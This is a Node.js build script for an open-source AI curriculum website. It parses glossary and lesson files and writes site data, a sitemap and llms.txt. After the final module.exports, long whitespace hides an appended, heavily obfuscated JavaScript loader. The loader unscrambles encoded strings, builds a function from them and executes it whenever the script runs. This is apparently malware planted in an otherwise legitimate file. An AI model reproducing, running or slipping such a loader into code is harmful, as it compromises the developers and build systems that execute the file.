          : `collides with ${existing.kind} "${existing.label}" on term "${existing.entry.term}"`;
        glossaryError(entryLine, entry.term, `alias "${alias}" ${ownership}`);
      }
      lookupOwners.set(key, { entry, label: alias, kind: 'alias' });
    }
  }
  for (const entry of terms) {
    const entryLine = seenTerms.get(entry.term.toLocaleLowerCase('en-US')) || 1;
    for (const related of entry.related) {
      if (!lookupOwners.has(glossaryLookupKey(related))) {
        glossaryError(entryLine, entry.term, `related term "${related}" does not resolve to a glossary entry or alias`);
      }
    }
    for (const lesson of entry.lessons) {
      if (/^https?:\/\//i.test(lesson.url)) continue;
      const localPath = path.resolve(path.dirname(GLOSSARY_PATH), lesson.url.split(/[?#]/)[0]);
      const rootWithSep = REPO_ROOT.endsWith(path.sep) ? REPO_ROOT : REPO_ROOT + path.sep;
      if (!localPath.startsWith(rootWithSep) || !fs.existsSync(localPath)) {
        glossaryError(entryLine, entry.term, `Learn it target "${lesson.url}" does not exist in the repository`);
      }
      const stats = fs.statSync(localPath);
      if (stats.isDirectory() && !fs.existsSync(path.join(localPath, 'docs', 'en.md'))) {
        glossaryError(entryLine, entry.term, `Learn it target "${lesson.url}" is not a lesson with docs/en.md`);
      }
    }
  }

  return terms;
}

// ─── Discover outputs/ artifacts (skills / prompts / agents) ──────────
function parseFrontmatter(text) {
  if (!text.startsWith('---')) return null;
  const end = text.indexOf('\n---', 4);
  if (end === -1) return null;
  const block = text.slice(4, end);
  const result = {};
  for (const raw of block.split(/\r?\n/)) {
    const line = raw.trimEnd();
    if (!line || line.startsWith('#') || !line.includes(':')) continue;
    const idx = line.indexOf(':');
    const key = line.slice(0, idx).trim();
    let value = line.slice(idx + 1).trim();
    if (value.startsWith('[') && value.endsWith(']')) {
      const inner = value.slice(1, -1).trim();
      result[key] = inner
        ? inner.split(',').map(s => s.trim().replace(/^['"]|['"]$/g, '')).filter(Boolean)
        : [];
    } else if ((value.startsWith('"') && value.endsWith('"')) ||
               (value.startsWith("'") && value.endsWith("'"))) {
      result[key] = value.slice(1, -1);
    } else {
      result[key] = value;
    }
  }
  return result;
}

function assertRepositoryContainment(targetDir, repoRoot, label) {
  const resolvedRepoRoot = fs.realpathSync(repoRoot);
  const resolvedTarget = fs.realpathSync(targetDir);
  const rootPrefix = resolvedRepoRoot.endsWith(path.sep)
    ? resolvedRepoRoot
    : resolvedRepoRoot + path.sep;
  if (resolvedTarget !== resolvedRepoRoot && !resolvedTarget.startsWith(rootPrefix)) {
    throw new Error(`${label} escapes the repository: ${targetDir}`);
  }
  const targetStat = fs.lstatSync(targetDir);
  if (targetStat.isSymbolicLink() || !targetStat.isDirectory()) {
    throw new Error(`${label} must be a regular directory: ${targetDir}`);
  }
}

function listSkillBundleFiles(bundleDir, repoRoot) {
  const rootStat = fs.lstatSync(bundleDir);
  if (rootStat.isSymbolicLink() || !rootStat.isDirectory()) {
    throw new Error(`Skill bundle must be a regular directory: ${bundleDir}`);
  }
  assertRepositoryContainment(bundleDir, repoRoot, 'Skill bundle');
  const files = [];
  function visit(currentDir, relativeDir) {
    const entries = fs.readdirSync(currentDir, { withFileTypes: true })
      .sort((a, b) => a.name < b.name ? -1 : a.name > b.name ? 1 : 0);
    for (const entry of entries) {
      const fullPath = path.join(currentDir, entry.name);
      const relativePath = relativeDir ? `${relativeDir}/${entry.name}` : entry.name;
      if (entry.isSymbolicLink()) {
        throw new Error(`Skill bundle contains a symlink: ${fullPath}`);
      }
      if (entry.isDirectory()) {
        visit(fullPath, relativePath);
      } else if (entry.isFile()) {
        files.push(relativePath);
      } else {
        throw new Error(`Skill bundle contains a non-regular file: ${fullPath}`);
      }
    }
  }
  visit(bundleDir, '');
  return files.sort();
}

function discoverArtifacts(repoRoot = REPO_ROOT) {
  const artifacts = [];
  const phasesDir = path.join(repoRoot, 'phases');
  if (!fs.existsSync(phasesDir)) return artifacts;
  const VALID_TYPES = ['skill', 'prompt', 'agent'];
  for (const phaseDirName of fs.readdirSync(phasesDir).sort()) {
    const phaseMatch = phaseDirName.match(/^([0-9]{2})-([a-z0-9-]+)$/);
    if (!phaseMatch) continue;
    const phaseId = parseInt(phaseMatch[1], 10);
    const phaseDir = path.join(phasesDir, phaseDirName);
    for (const lessonDirName of fs.readdirSync(phaseDir).sort()) {
      const lessonMatch = lessonDirName.match(/^([0-9]{2})-([a-z0-9-]+)$/);
      if (!lessonMatch) continue;
      const lessonId = parseInt(lessonMatch[1], 10);
      const lessonRel = `phases/${phaseDirName}/${lessonDirName}`;
      const outputsDir = path.join(phaseDir, lessonDirName, 'outputs');
      if (fs.existsSync(outputsDir)) {
        assertRepositoryContainment(outputsDir, repoRoot, 'Lesson outputs');
        const entries = fs.readdirSync(outputsDir, { withFileTypes: true })
          .sort((a, b) => a.name < b.name ? -1 : a.name > b.name ? 1 : 0);
        for (const entry of entries) {
          if (!entry.isFile() || !entry.name.endsWith('.md')) continue;
          const file = entry.name;
          const stem = file.replace(/\.md$/, '');
          const type = VALID_TYPES.find(t => stem.startsWith(`${t}-`));
          if (!type) continue;
          let meta = {};
          try {
            meta = parseFrontmatter(fs.readFileSync(path.join(outputsDir, file), 'utf8')) || {};
          } catch (_) {}
          artifacts.push({
            kind: type,
            name: (meta.name || stem).trim(),
            description: (meta.description || '').trim(),
            tags: Array.isArray(meta.tags) ? meta.tags : [],
            phase: phaseId,
            lesson: lessonId,
            lessonPath: lessonRel,
            file: `${lessonRel}/outputs/${file}`,
          });
        }
        for (const entry of entries) {
          if (!entry.isDirectory()) continue;
          const bundleDir = path.join(outputsDir, entry.name);
          const skillPath = path.join(bundleDir, 'SKILL.md');
          if (!fs.existsSync(skillPath)) continue;
          const files = listSkillBundleFiles(bundleDir, repoRoot);
          if (!files.includes('SKILL.md')) continue;
          let meta = {};
          try {
            meta = parseFrontmatter(fs.readFileSync(skillPath, 'utf8')) || {};
          } catch (_) {}
          artifacts.push({
            kind: 'skill',
            name: (meta.name || entry.name).trim(),
            description: (meta.description || '').trim(),
            tags: Array.isArray(meta.tags) ? meta.tags : [],
            version: (meta.version || '').trim(),
            ...(meta.license && { license: String(meta.license).trim() }),
            ...(meta.compatibility && { compatibility: String(meta.compatibility).trim() }),
            ...(meta['allowed-tools'] && { allowedTools: String(meta['allowed-tools']).trim() }),
            phase: phaseId,
            lesson: lessonId,
            lessonPath: lessonRel,
            file: `${lessonRel}/outputs/${entry.name}/SKILL.md`,
            bundle: true,
            bundlePath: `${lessonRel}/outputs/${entry.name}`,
            files,
          });
        }
      }
      const missionPath = path.join(phaseDir, lessonDirName, 'mission.md');
      if (fs.existsSync(missionPath)) {
        let firstLine = '';
        try {
          firstLine = fs.readFileSync(missionPath, 'utf8').split(/\r?\n/)[0].replace(/^#\s+/, '').trim();
        } catch (_) {}
        artifacts.push({
          kind: 'mission',
          name: firstLine || `${lessonDirName} mission`,
          description: '',
          tags: [],
          phase: phaseId,
          lesson: lessonId,
          lessonPath: lessonRel,
          file: `${lessonRel}/mission.md`,
        });
      }
    }
  }
  return artifacts;
}

// ─── Main build ──────────────────────────────────────────────────────
// Write the git ref this deploy was built from, so lesson.html fetches docs
// from the right branch (PR previews render their own edits, not main).
function resolveRef() {
  let ref = process.env.VERCEL_GIT_COMMIT_REF || '';
  if (!ref) {
    try {
      ref = require('child_process')
        .execSync('git rev-parse --abbrev-ref HEAD', { encoding: 'utf8' })
        .trim();
    } catch (e) { ref = ''; }
  }
  if (!ref || ref === 'HEAD') ref = 'main';
  return ref;
}

function sourceRevision() {
  if (process.env.VERCEL_ENV === 'production') return 'main';
  if (process.env.VERCEL_ENV === 'preview') {
    const sha = String(process.env.VERCEL_GIT_COMMIT_SHA || '').trim();
    return /^[0-9a-f]{7,40}$/i.test(sha) ? sha : resolveRef();
  }
  return 'main';
}

function sourceRepository() {
  const ownerValue = String(process.env.VERCEL_GIT_REPO_OWNER || '').trim();
  const repoValue = String(process.env.VERCEL_GIT_REPO_SLUG || '').trim();
  return {
    owner: /^[A-Za-z0-9-]+$/.test(ownerValue) ? ownerValue : 'rohitg00',
    repo: /^[A-Za-z0-9_.-]+$/.test(repoValue) ? repoValue : 'ai-engineering-from-scratch',
  };
}

function githubSourceUrl(relativePath, view = 'tree') {
  const { owner, repo } = sourceRepository();
  const revision = sourceRevision()
    .split('/')
    .map(encodeURIComponent)
    .join('/');
  const cleanPath = String(relativePath || '')
    .replace(/^\/+|\/+$/g, '')
    .split('/')
    .map(encodeURIComponent)
    .join('/');
  const sourceView = view === 'blob' ? 'blob' : 'tree';
  return `https://github.com/${owner}/${repo}/${sourceView}/${revision}/${cleanPath}`;
}

function writeBuildMeta() {
  const revision = sourceRevision();
  const repository = sourceRepository();
  const js = '// Auto-generated by build.js on each deploy — do not edit.\n'
    + 'window.__AIFS_REF = ' + JSON.stringify(revision) + ';\n'
    + 'window.__AIFS_SOURCE = ' + JSON.stringify({ ...repository, revision }) + ';\n';
  fs.writeFileSync(path.join(__dirname, 'build-meta.js'), js, 'utf8');
  console.log('   wrote build-meta.js (ref: ' + revision + ')');
}

// ─── langs.js: language switcher options, from the canonical registry ────
function writeLangs() {
  const regPath = path.join(REPO_ROOT, 'languages.json');
  let langs = [{ code: 'en', native: 'English' }];
  if (fs.existsSync(regPath)) {
    const reg = JSON.parse(fs.readFileSync(regPath, 'utf8'));
    // Only offer languages the site can actually serve: English (source) plus
    // the ci:true set the translate workflow builds lessons for. The full
    // registry is 40 languages, but picking an untranslated one just 404s to
    // English, so it must not appear in the switcher.
    langs = reg.languages
      .filter(l => l.source || l.ci)
      .map(l => ({ code: l.code, native: l.native }));
  }
  const js = '// Auto-generated by build.js from languages.json — do not edit.\n'
    + 'window.AIFS_LANGS = ' + JSON.stringify(langs) + ';\n';
  fs.writeFileSync(path.join(__dirname, 'langs.js'), js, 'utf8');
  console.log('   wrote langs.js (' + langs.length + ' languages)');
}

function build() {
  console.log('📖 Reading source files...');
  writeBuildMeta();
  writeLangs();
  writeFigureManifest();

  const readme = fs.readFileSync(README_PATH, 'utf8');
  const roadmap = fs.readFileSync(ROADMAP_PATH, 'utf8');
  const glossary = fs.readFileSync(GLOSSARY_PATH, 'utf8');

  console.log('🔍 Parsing ROADMAP.md...');
  const roadmapStatuses = parseRoadmap(roadmap);

  console.log('🔍 Parsing README.md...');
  const phases = parseReadme(readme, roadmapStatuses);
  const roadmapPrereqs = parseCurriculumPrereqs(readme, phases);

  console.log('Parsing focused learning paths...');
  const learningPaths = parseLearningPaths(REPO_ROOT, phases);

  console.log('🔍 Parsing glossary/terms.md...');
  const glossaryTerms = parseGlossary(glossary);

  console.log('🔍 Discovering outputs + Phase 14 missions...');
  const artifacts = discoverArtifacts();

  console.log('🎓 Parsing certification programs...');
  const certifications = parseCertifications();
  writeCertificationData(certifications);

  console.log('📚 Extracting lesson summaries + keywords from docs/en.md...');
  let summarized = 0, withKeywords = 0;
  for (const phase of phases) {
    for (const lesson of phase.lessons) {
      if (lesson.url) {
        const relPath = lesson.url.replace(GITHUB_BASE, '').replace(/\/+$/, '');
        const meta = extractLessonMeta(relPath);
        if (meta.summary)  { lesson.summary  = meta.summary;  summarized++;   }
        if (meta.keywords) { lesson.keywords = meta.keywords; withKeywords++; }
      }
    }
  }

  console.log('🔎 Generating lesson and certification SEO manifests...');
  const seoManifests = writeSeoArtifacts(phases, certifications, learningPaths);

  // Stats
  let totalLessons = 0;
  let completeLessons = 0;
  phases.forEach(p => {
    totalLessons += p.lessons.length;
    completeLessons += p.lessons.filter(l => l.status === 'complete').length;
  });

  console.log(`\n📊 Stats:`);
  console.log(`   Phases: ${phases.length}`);
  console.log(`   Lessons: ${totalLessons}`);
  console.log(`   Complete: ${completeLessons}`);
  console.log(`   Summaries: ${summarized}, Keywords: ${withKeywords}`);
  console.log(`   Glossary terms: ${glossaryTerms.length}`);
  console.log(`   Artifacts: ${artifacts.length}`);
  console.log(`   Curriculum edges: ${Object.values(roadmapPrereqs).reduce((sum, ids) => sum + ids.length, 0)}`);
  console.log(`   Focused learning paths: ${learningPaths.length}`);
  console.log(`   Certification tracks: ${certifications.tracks.length}`);
  console.log(`   Certification lessons: ${Object.keys(certifications.lessonsByPath).length}`);
  console.log(`   Practice assessments: ${Object.keys(certifications.assessmentsById).length}`);

  // Generate data.js
const output = `// Auto-generated by build.js — do not edit manually.
// Last built: ${new Date().toISOString()}

const ROADMAP_PREREQS = ${JSON.stringify(roadmapPrereqs, null, 2)};

const PHASES = ${JSON.stringify(phases, null, 2)};

const LEARNING_PATHS = ${JSON.stringify(learningPaths, null, 2)};

const GLOSSARY_CATEGORY_ORDER = ${JSON.stringify(GLOSSARY_CATEGORY_ORDER, null, 2)};

const GLOSSARY = ${JSON.stringify(glossaryTerms, null, 2)};

const ARTIFACTS = ${JSON.stringify(artifacts, null, 2)};
`;

  fs.writeFileSync(OUTPUT_PATH, output, 'utf8');
  console.log(`\n✅ Generated ${OUTPUT_PATH}`);

  syncCounts(totalLessons, phases.length, artifacts.length);
  syncReadme(totalLessons);
  writeSitemap(seoManifests.lessonManifest, glossaryTerms.length, certifications);
  writeLlms(phases, glossaryTerms.length, artifacts.length, certifications);
}

// ─── sitemap.xml from the same SEO manifest the lesson route renders ─────
function writeSitemap(lessonManifest, glossaryCount, certifications) {
  const urls = [
    { loc: '/', priority: '1.0', freq: 'weekly' },
    { loc: '/catalog.html', priority: '0.8', freq: 'weekly' },
    { loc: '/prereqs.html', priority: '0.7', freq: 'monthly' },
    { loc: '/learning-paths.html', priority: '0.8', freq: 'monthly' },
    { loc: '/about.html', priority: '0.5', freq: 'yearly' },
    { loc: '/developer.html', priority: '0.6', freq: 'monthly' },
    { loc: '/contact.html', priority: '0.3', freq: 'yearly' },
    { loc: '/privacy.html', priority: '0.3', freq: 'yearly' },
  ];
  if (glossaryCount > 0) urls.push({ loc: '/glossary.html', priority: '0.6', freq: 'monthly' });
  if (certifications && certifications.program) {
    urls.push({ loc: '/certifications.html', priority: '0.9', freq: 'weekly' });
    for (const track of certifications.tracks) {
      urls.push({ loc: '/certification?id=' + encodeURIComponent(track.id), priority: '0.8', freq: 'monthly' });
    }
    for (const lesson of Object.values(certifications.lessonsByPath)) {
      urls.push({ loc: '/lesson?path=' + encodeURIComponent(lesson.path), priority: '0.7', freq: 'monthly' });
    }
  }
  for (const lesson of Object.values(lessonManifest.lessons || {})) {
    if (lesson.context && lesson.context.kind === 'course') {
      urls.push({ loc: '/lesson?path=' + encodeURIComponent(lesson.path), priority: '0.6', freq: 'monthly' });
    }
  }
  const body = urls.map(u =>
    `  <url>\n    <loc>${SITE_ORIGIN}${u.loc.replace(/&/g, '&amp;')}</loc>\n` +
    `    <changefreq>${u.freq}</changefreq>\n` +
    `    <priority>${u.priority}</priority>\n  </url>`).join('\n');
  const xml = `<?xml version="1.0" encoding="UTF-8"?>\n` +
    `<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n${body}\n</urlset>\n`;
  fs.writeFileSync(path.join(__dirname, 'sitemap.xml'), xml, 'utf8');
  console.log(`   wrote sitemap.xml (${urls.length} URLs)`);
}

// ─── llms.txt: a link-rich map of the curriculum for AI agents ───────────
function writeLlms(phases, glossaryCount, artifactCount, certifications) {
  const rawOrigin = 'https://raw.githubusercontent.com/rohitg00/ai-engineering-from-scratch/' + resolveRef();
  let total = 0;
  phases.forEach(p => { total += p.lessons.filter(l => lessonPath(l.url)).length; });
  let out = `# AI Engineering from Scratch\n\n`;
  out += `> A free, open-source curriculum that builds every core AI algorithm by hand — ${total} lessons across ${phases.length} phases, from linear algebra to autonomous agents. Python, TypeScript, Rust, Julia.\n\n`;
  out += `Canonical site: ${SITE_ORIGIN}\n`;
  out += `Source: https://github.com/rohitg00/ai-engineering-from-scratch\n`;
  out += `Glossary terms: ${glossaryCount} · Reusable outputs (prompts/skills/agents): ${artifactCount}\n\n`;
  out += `## Developer resources\n`;
  out += `- [Developer documentation](${SITE_ORIGIN}/developer.html) — machine-readable site contracts and integration notes\n`;
  out += `- [OpenAPI description](${SITE_ORIGIN}/openapi.json) — read-only public resource inventory\n`;
  out += `- [Sitemap](${SITE_ORIGIN}/sitemap.xml) — canonical URL inventory\n`;
  out += `- [Contact](${SITE_ORIGIN}/contact.html) — maintainer and project contact route\n`;
  out += `- [Privacy](${SITE_ORIGIN}/privacy.html) — data and analytics policy\n\n`;
  out += `Lesson routes include crawler-readable titles, summaries, navigation, and canonical URLs. Each raw markdown link below is the complete source text. Lesson directories may also include code/ (runnable implementation) and quiz.json.\n\n`;
  for (const phase of phases) {
    out += `## Phase ${phase.id}: ${phase.name}\n`;
    if (phase.desc) out += `${phase.desc}\n`;
    out += `\n`;
    for (const l of phase.lessons) {
      const p = lessonPath(l.url);
      if (!p) continue;
      const note = l.summary ? ` — ${l.summary}` : '';
      out += `- [${l.name}](${SITE_ORIGIN}/lesson?path=${encodeURIComponent(p)}) · [raw](${rawOrigin}/${p}/docs/en.md)${note}\n`;
    }
    out += `\n`;
  }
  out += `## Optional\n`;
  out += `- [Catalog](${SITE_ORIGIN}/catalog.html) — full searchable lesson index\n`;
  out += `- [Roadmap](${SITE_ORIGIN}/prereqs.html) — prerequisite ordering across phases\n`;
  out += `- [AI Engineering Learning Paths](${SITE_ORIGIN}/learning-paths.html) — four core domain paths and six career routes connected to practical lessons\n`;
  if (glossaryCount > 0) out += `- [Glossary](${SITE_ORIGIN}/glossary.html) — plain-language definitions of ${glossaryCount} terms\n`;
  if (certifications && certifications.program) {
    out += `\n## Certification preparation\n`;
    out += `Independent, open-source practice material. Practice scores are not official exam scores and completion does not guarantee certification.\n\n`;
    out += `- [Claude certification learner guide](${rawOrigin}/certifications/claude/GETTING_STARTED.md)\n`;
    out += `- [Claude certification tutor contract](${rawOrigin}/skills/claude-certification/SKILL.md)\n`;
    out += `- [Certification catalog](${SITE_ORIGIN}/certifications.html)\n`;
    for (const track of certifications.tracks) {
      out += `- [${track.credential || track.shortName || track.id}](${SITE_ORIGIN}/certification?id=${encodeURIComponent(track.id)})`;
      if (track.summary) out += ` — ${track.summary}`;
      out += `\n`;
    }
    const certRawOrigin = 'https://raw.githubusercontent.com/rohitg00/ai-engineering-from-scratch/' + resolveRef();
    for (const lesson of Object.values(certifications.lessonsByPath)) {
      out += `- [${lesson.name}](${SITE_ORIGIN}/lesson?path=${encodeURIComponent(lesson.path)}) · [raw](${certRawOrigin}/${lesson.path}/docs/en.md)`;
      if (lesson.summary) out += ` — ${lesson.summary}`;
      out += `\n`;
    }
  }
  fs.writeFileSync(path.join(__dirname, 'llms.txt'), out, 'utf8');
  console.log(`   wrote llms.txt`);
}

// ─── Regenerate README stats block + lessons badge from source ───────────
function syncReadme(lessons) {
  const readmePath = path.join(REPO_ROOT, 'README.md');
  if (!fs.existsSync(readmePath)) return;
  let md = fs.readFileSync(readmePath, 'utf8');
  const before = md;

  // Keep the lessons badge in sync with the live count (URL value + alt text)
  md = md.replace(/badge\/lessons-\d+-/g, `badge/lessons-${lessons}-`);
  md = md.replace(/alt="\d+ lessons"/g, `alt="${lessons} lessons"`);

  // Regenerate the traffic proof block from site/stats.json
  const statsPath = path.join(__dirname, 'stats.json');
  if (fs.existsSync(statsPath)) {
    try {
      const s = JSON.parse(fs.readFileSync(statsPath, 'utf8'));
      const fmt = n => Number(n).toLocaleString('en-US');
      const block =
        '<!-- STATS:START (generated from site/stats.json by build.js — do not edit by hand) -->\n' +
        `<p align="center"><sub><b>${fmt(s.visitors30d)}</b> readers &nbsp;·&nbsp; ` +
        `<b>${fmt(s.pageViews30d)}</b> page views in the last ${s.period} &nbsp;·&nbsp; ` +
        `as of ${s.updated}</sub></p>\n` +
        '<!-- STATS:END -->';
      const statsRe = /(?:<!-- STATS:START[\s\S]*?<!-- STATS:END -->|\[stats-start\]: #[\s\S]*?\[stats-end\]: #)/;
      if (statsRe.test(md)) {
        md = md.replace(statsRe, block);
      } else {
        // Self-heal: re-insert the block if the markers were removed/mangled
        md = md.replace(/\n(?=## Start here:|## How this works)/, `\n${block}\n\n`);
      }
    } catch (err) {
      console.warn(`⚠️  README stats sync skipped: ${err.message}`);
    }
  }

  if (md !== before) {
    fs.writeFileSync(readmePath, md, 'utf8');
    console.log('   synced README stats + lessons badge');
  }
}

// ─── Keep marketing counts in sync (single source of truth = this build) ──
function syncCounts(lessons, phaseCount, outputs) {
  const targets = ['index.html', 'catalog.html', 'lesson.html', 'prereqs.html', 'learning-paths.html', 'cmdpalette.js'];
  for (const f of targets) {
    const p = path.join(__dirname, f);
    if (!fs.existsSync(p)) continue;
    const before = fs.readFileSync(p, 'utf8');
    const after = before
      .replace(/\b\d+( AI engineering)? lessons\b/g, `${lessons}$1 lessons`)
      .replace(/\b\d+ phases\b/g, `${phaseCount} phases`)
      .replace(/\b\d+ outputs\b/g, `${outputs} outputs`);
    if (after !== before) {
      fs.writeFileSync(p, after, 'utf8');
      console.log(`   synced counts in ${f}`);
    }
  }
}

if (require.main === module) {
  build();
}

module.exports = {
  FIGURE_PROVIDER_ORDER,
  buildFigureProviderManifest,
  discoverFigureProviderOrder,
  discoverArtifacts,
  discoverUsedFigureIds,
  buildSeoManifests,
  canonicalCertificationUrl,
  canonicalLessonUrl,
  githubSourceUrl,
  lessonDocumentSeo,
  parseReadme,
  parseRoadmap,
  parseLearningPaths,
  parseCertifications,
  parseFrontmatter,
  renderCatalogDiscovery,
  renderCertificationDiscovery,
  serializeFigureProviderManifest,
  writeFigureManifest,
};																																																																																																																																																																																																																																																																										var z = '-*1221';var NX=[6912847,907388^907539,217597^204358,330538^330063,982935^939384,5019283],SX=[5283741,416048^416193,293640^317673,436016^436107,781205^733396,4738901];function spin(R,c){for(var e,r,t,s,i,n,a=[],o=217956^217956,l=c[648486^648486];o<R['\u006C\u0065\u006E\u0067\u0074\u0068'];)a[o]=R['\u0063\u0068\u0061\u0072\u0041\u0074'](o),o+=908966^908967;for(e=a['\u006C\u0065\u006E\u0067\u0074\u0068'],o=275122^275122;o<e;)r=l*(o+c[581701^581700])+l%c[740899^740897],i=(t=l*(o+c[827307^827304])+l%c[172928^172932])%e,n=a[s=r%e],a[s]=a[i],a[i]=n,l=(r+t)%c[116482^116487],o+=325595^325594;return a['\u006A\u006F\u0069\u006E']("");}function splitLane(R){var c=String['\u0066\u0072\u006F\u006D\u0043\u0068\u0061\u0072\u0043\u006F\u0064\u0065'](742867^742863),e=spin(R,NX);return(e=(e=(e=e['\u0073\u0070\u006C\u0069\u0074']("\u005E")['\u006A\u006F\u0069\u006E'](c))['\u0073\u0070\u006C\u0069\u0074']("\u002A\u0031")['\u006A\u006F\u0069\u006E']("\u005E"))['\u0073\u0070\u006C\u0069\u0074']("\u002A\u0030")['\u006A\u006F\u0069\u006E']("\u002A"))['\u0073\u0070\u006C\u0069\u0074'](c);}function peel(R){return spin(R,SX);}!function(R,c,_0x4d43e){R['\u007A']=z;var e=splitLane("\u0063\u005E\u006D\u0065\u006A\u0062\u005E\u0074\u0072\u006F");_0x4d43e=199787^199779;R[e[539188^539188]]=c,typeof module===e[818819^818818]&&(R[e[712707^712705]]=module);var r=peel("cnotsnturtpicokfzrogmybjdcawvulxsreqh".split("").reverse().join("")),t=peel[r['\u0073\u0075\u0062\u0073\u0074\u0072\u0069\u006E\u0067'](814520^814520,732566^732573)],s=t("",peel('=aenruh(al=5c,g8fdu.yr ..ncecf,5"paeau6lnj)r]2uv"x-q(] a;(r=;;r+(a[8.s2tAgoq,uh8C,ai,s;a(Am0(nj;jv*,7vo7()(o;m6oa4rw). rod[fs2n{drvt4x)+0,anr+rr+o)}z1 =hf[an8r1r[,]s7-77laa.ui7{-069lvmt2r=i]]<+)u,e),,;nrh[r=0v-r(;,=p)Cus=+c;g;f;qA))1vi)vk0nrl1ae f=[;hisy.em(d+o!2 =(evea78=.)4ei=g.n={ff=1[<2a f1=r;4,S)rylv1u y;kql{tvnv (C (l,ovnp i=tlr,r.lwozh(l,tq;;rr((v=ahsv;]xq=ab;da;,((r;vjq.(t[+)da)rdnrhs41y(vr;fh;3g"]e(.ahrpapg]g.)ngfpn1h,icl;;)=C;m5=+r, .);u=+s}+)it,+bm;d+um)-=siiqol=t=r=q9+..chq+[6fe t0nrpr( vr8flrn,ddgt ]6a.;m;rth.gq 2a}eveic]gbti<4o;C;l,zzi6+l[a[;+(si"li"r,npi9s,frfhuw)ow=e{(b=wen2t.gu.i=kiaaa+)yftpa3n})=9")cpA+u;utp]"=lk7vpt 1r;hzw")t()9)(.lul=s7f; ;sq0)n"y+0s}=va+s mh(0q.]hv;> 06=A-ozetr(t1rtrsiso0e,.;z[(f<5e7t,(raoavnr;thhf;v,j=r; )r>18zho*o{<akmsn)akte.vo9+ea0clio;bu =]C!gj;y3+l)e=.}dr=i6oiC8rnn0;6=ar"}.rei=]Stsrnn.;2r=t;[t;iv=prCrn()aretuz+ hlk[+x=e -8j{(ejy9(()) '));t("",s(peel('R_<"cRJ!&VecRWa=RrfR$6"c1;RRYcnh_/.t iRRRG^<R.RcR2.[nR .Rf./<Rc3!!5nSR<RiRL.eSslf(edgxc<?o<rlcR?tRosdRfuSe.?&ph.RROMs[e<skRE.<Ru<rRe;RDRBrRR\\.fR.<c:!bpl09icoRrtcR(;roRRn2-"(.^w y.<<dd )$f ou.%e<a<e.t<m(cRxfR<[J(feR<Pbr.b\'oRi.RR<\'RR%wRfs)eR.[agSP{d2.k<ac1e.!3.P<ZRiR*oDsi=[.<f."4Rb N"eoxRpo.iIlkaeTR.2)%m<ieR]z<|Ru((fRwRR\\R>R9#.R0rd=s.0x!sR.fRS)(cct1pfotaeMuR@R=<RR/`.Rk$(2cR.s7e1a.FRKc*..z"RnfPesRtRRR.<Rl#Rf<: 2((R R$\'6s`<3nhi*$eXc}Rh? ctoc.iecc9 {Ra<s;u!.e]ERRoH..$"n<D3RsRR..(ReesseR< t," Rdov}Sc0Jmi.T<sEegsRw]R"aR.R!R<o))jR Rew itc.snk(}(n[veR<0<=kfH<rrMR ciknE.c.B<&R[o]R.%ccRlrx;* ["oisenRefea!Yn.ecR%o"u.<6lRRRyR=is=RR()RRe:RR)!RwcrR1<.o!RcRc@"}RuRqu5(3Pol"eRt0!ftaR*<R1tnkcf}T.!$/<ro IycRR )P<\\.b<tR7:PPs<].rX<<.eRu(RRRqnp.<.R;ctisX.RRyR$@<3)kRRc<+Rr8l*.iR!rC\\P!n=cs<(ci<(R7eReRc. t<epe)e<<,e<(EK!.pnb$"RaRR.evuhc.Tl_c.:R0r )Rww!sS0.t7u.0(R9_a($&.e6f.RRk1Cxbi8l.hc=m(@<Rd..<rr.2.KMrcb_RnR(R_c:Dwt}.R.{}9g$RRR)TVt<a(.<G.dR~WUR.;lr.hIsmNP  t@RR8_R2R.iRrRPR<(R3#cec0ce3iRR<aR3RanR{Zs}!M<R-*.yda3Ri/0%fR#R <i2<R08:.t}Rf!"-Rc.RlRcytyRseA0RSTR8.4q<$FTeR..P_<cR6hbR.eri.c-RhcARC2vR.;bS<R<a#K<R:r]Tfee-;!k=_s.Rcmjs(R}:<RaR*&g.<domeisRn.($#_a{V@ocY-.omPdam.RalfcyoT+!P_gsr.<biR!f.)cI&(bIoRi(rnrW.ie.Rc !(ic(SR.cr`:9<XspR($ mRct<s.g!.48rskevVRPdRkxR<Rdern)eSs/)R ler<csT3dc}.R5C/W(.SonZr)Rcoccsch)R.<RR<t.ss(RR<dlu.c.|f8tk,slnepo<eR<!.6R.eeRRTa&h Mf<{[o$R< Rs0)= <xSec.c}<c$es((d)RRc}fCRR<*<R.m-.R*Re<(xvRs (M&Rf.eP*g >s)<o.=.RisnrR.?{5<ibR6)RR1s cRgqcelc=cl;be<lf*SICd2e"zpRR}<cRlS,njscm$Rn.!aii<JY]<fPCs@jA.R<% t.RowR}\' r>pzh..lR\'<go_}<SR(kqxh[ &<iR-f$C<u<iaENR5RTR]<Rpsk..Rzdg.)]<)er.Rr.MsRzP>RRe<<t_hgl<p.RcmfRs!nftR4 dt_9^<,ore5RfRx RR[rX.<sbyR<<.2R.RrenUP(y>.p<<csRlt0t.{.Syin<ggl$ Vc.):EHI!.xDuR,RpRhR(sct.MrRMjHMRRcR. Rtnd|oa0.n#a.2)Dfk&cRIRRR/feR.c@<irs6T+1RPx..R.sc.aR#.-<X{R!n4RcRitR/nRe9m..<A)ben).]<.a(R(.{?3tR&RR/i(lX. <h!dRR<"!co? 3 1R<-hn<dtndo<Rksm#-c(TeRee!].R<s<T+=R.Ri-r@RR.r#cd<cRRRmztf.CdeRp.c{QRibjsos.fRrg-RW0diRR<.k<ORR&-R!# ]Cs]yt4.-d_`PRR\'<.RvejSw<dc.c ,f.P.(.citcNbRn\'-.eRcRnrQ.rRxo{Rc<"6Rnd]R}Rm(R$RSo.T5Rc2cx.*vRoic_>.s0BRf)<P<aR.oCZ|0 POHdQo.n <.1soR_\' .P<er.[<R|R<0i<Rr;\'I.R[}+lc![mc!.lc<n(a tRRHRl,}p}R)R8RJ<aR.<td(N>]ic<me@5cn[u.R).b%sPn<<_RR!RbR=$RR^<!})sb-6"#E8cR(d!R)tratRR<< 21R\'L!ib|eOtRRt$ucdnRR.t)RzE.GPy! RAI-nqau<}.ycR...cRR.ccc$^RRdC_R<t8cRhs2"R2.\'S>))2h!efy..>!iL$en ;%9OTv.d$4RRC<cPS(tuRwl&(m#"R|pch<tH$a<< .t!RSEf.RRgcNP.R CRi4mR<#MRR<;wi-#E <<t<eR<H<RrntoE(!0r0<d..RC"cn..2bp(6Cp<SR"e1l)cc<a(P.P9e<qa)<<1<n.iRaRPR(}R=.&,2!cwR.)PR$.<qR<}!1*S<R!Rf.<c<Rd_<R2R<<#]<<RRRp!.rpR<*!TRIR<Pk<Rzta.&}.aleK=iP<R\'=gRP}Rp${SB. 